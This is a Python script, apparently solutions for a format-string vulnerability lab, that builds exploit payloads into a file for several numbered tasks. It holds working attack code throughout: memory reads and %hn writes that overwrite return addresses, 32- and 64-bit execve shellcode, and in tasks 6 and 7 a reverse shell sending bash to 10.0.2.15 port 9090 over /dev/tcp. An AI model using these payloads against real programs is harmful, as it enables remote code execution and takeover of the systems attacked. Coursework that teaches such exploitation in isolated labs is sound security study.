#!/usr/bin/python3
import argparse

parser = argparse.ArgumentParser(description='test')
parser.add_argument('--task', type=int, help='task')
parser.add_argument('--frame')
parser.add_argument('--buffer')
parser.add_argument('--part', help='task', default="")
args = parser.parse_args()
task = args.task
part = args.part
frame = int(args.frame, base=16)
buffer = int(args.buffer, base=16)


if task == 2:
	if part == "A":
		with open('cute.txt', 'w') as f:
			f.write("%d"*64)

	if part == "B":
		with open('cute.txt', 'wb') as f:
			content = bytearray(0 for i in range(260))
			content[0:4] = (0x080b4008).to_bytes(4,byteorder='little')
			content[4:256] = ("%32d"*63).encode()
			content[256:258] = "%s".encode()
			f.write(content)
if task == 3:
	with open('cute.txt', 'wb') as f:
		content = bytearray(0 for i in range(300))
		content[0:4] = (0xffffffff).to_bytes(4, 'little')
		content[4:8] = (0x080e506a).to_bytes(4, 'little')
		content[8:12] = (0xffffffff).to_bytes(4, 'little')
		content[12:16] = (0x080e5068).to_bytes(4, 'little')
		content[16:268] = ("%32d"*63).encode()
		content[268:278] = ("%41675d%hn").encode()
		content[278:287] = ("%8738d%hn").encode()
		f.write(content)

if task == 4:	
	with open('cute.txt', 'wb') as f:
		ret = frame + 4
		shellcode_32 = (
		   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
		   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
		   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
		   "/bin/bash*"
		   "-c*"
		   # The * in this line serves as the position marker         *
		   "/bin/ls -l; echo '===== Success! ======'                  *"
		   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
		   "BBBB"   # Placeholder for argv[1] --> "-c"
		   "CCCC"   # Placeholder for argv[2] --> the command string
		   "DDDD"   # Placeholder for argv[3] --> NULL
		).encode('latin-1') # length:136
		content = bytearray(0 for i in range(500))
		content[0:4] = (0x33333333).to_bytes(4, 'little')
		content[4:8] = (ret).to_bytes(4, 'little')
		content[8:12] = (0x33333333).to_bytes(4, 'little')
		content[12:16] = (ret+2).to_bytes(4, 'little')
		content[16:268] = ("%32d"*63).encode()
		shellplace = buffer + 288
		part1 = int.from_bytes(shellplace.to_bytes(4, 'little')[0:2], 'little') 
		part2 = int.from_bytes(shellplace.to_bytes(4, 'little')[2:4], 'little') # mostly 0xffff
		content[268:278] = ("%{}d%hn".format(part1-16-32*63)).encode()
		content[278:288] = ("%{}d%hn".format(part2-part1)).encode()
		content[288:424] = shellcode_32
		f.write(content)
		
if task == 5:
	with open('cute.txt', 'wb') as f:
		ret = frame + 8
		shellcode_64 = (
		   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
		   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
		   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
		   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
		   "/bin/bash*"
		   "-c*"
		   # The * in this line serves as the position marker         *
		   "/bin/ls -l; echo '===== Success! ======'                  *"
		   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
		   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
		   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
		   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
		).encode('latin-1') # length:165
		content = bytearray(0 for i in range(100))
		
		shellplace = buffer+96
		part1 = int.from_bytes(shellplace.to_bytes(8, 'little')[0:2], 'little') 
		part2 = int.from_bytes(shellplace.to_bytes(8, 'little')[2:4], 'little')
		part3 = int.from_bytes(shellplace.to_bytes(8, 'little')[4:6], 'little')
		
		content[0:16] = ("%40${}d%41$hn".format(part3)).encode()
		content[16:32] = ("%42${}d%43$hn".format(part1-part3)).encode()
		content[32:48] = ("%44${}d%45$hn".format(part2-part1)).encode()
		content[56:64] = (ret+4).to_bytes(8, "little")
		content[72:80] = (ret).to_bytes(8, "little")
		content[88:96] = (ret+2).to_bytes(8, "little")
		content[96:96+165] = shellcode_64
		f.write(content)

if task == 6:	
	with open('cute.txt', 'wb') as f:
		ret = frame + 4
		shellcode_32 = (
		   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
		   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
		   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
		   "/bin/bash*"
		   "-c*"
		   # The * in this line serves as the position marker         *
		   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
		   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
		   "BBBB"   # Placeholder for argv[1] --> "-c"
		   "CCCC"   # Placeholder for argv[2] --> the command string
		   "DDDD"   # Placeholder for argv[3] --> NULL
		).encode('latin-1') # length:136
		content = bytearray(0 for i in range(500))
		content[0:4] = (0x33333333).to_bytes(4, 'little')
		content[4:8] = (ret).to_bytes(4, 'little')
		content[8:12] = (0x33333333).to_bytes(4, 'little')
		content[12:16] = (ret+2).to_bytes(4, 'little')
		content[16:268] = ("%32d"*63).encode()
		shellplace = buffer + 288
		part1 = int.from_bytes(shellplace.to_bytes(4, 'little')[0:2], 'little') 
		part2 = int.from_bytes(shellplace.to_bytes(4, 'little')[2:4], 'little') # mostly 0xffff
		content[268:278] = ("%{}d%hn".format(part1-16-32*63)).encode()
		content[278:288] = ("%{}d%hn".format(part2-part1)).encode()
		content[288:424] = shellcode_32
		f.write(content)

if task == 7:
	with open('cute.txt', 'wb') as f:
		ret = frame + 8
		shellcode_64 = (
		   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
		   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
		   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
		   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
		   "/bin/bash*"
		   "-c*"
		   # The * in this line serves as the position marker         *
		   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
		   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
		   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
		   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
		   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
		).encode('latin-1') # length:165
		content = bytearray(0 for i in range(100))
		
		shellplace = buffer+96
		part1 = int.from_bytes(shellplace.to_bytes(8, 'little')[0:2], 'little') 
		part2 = int.from_bytes(shellplace.to_bytes(8, 'little')[2:4], 'little')
		part3 = int.from_bytes(shellplace.to_bytes(8, 'little')[4:6], 'little')
		
		content[0:16] = ("%40${}d%41$hn".format(part3)).encode()
		content[16:32] = ("%42${}d%43$hn".format(part1-part3)).encode()
		content[32:48] = ("%44${}d%45$hn".format(part2-part1)).encode()
		content[56:64] = (ret+4).to_bytes(8, "little")
		content[72:80] = (ret).to_bytes(8, "little")
		content[88:96] = (ret+2).to_bytes(8, "little")
		content[96:96+165] = shellcode_64
		f.write(content)

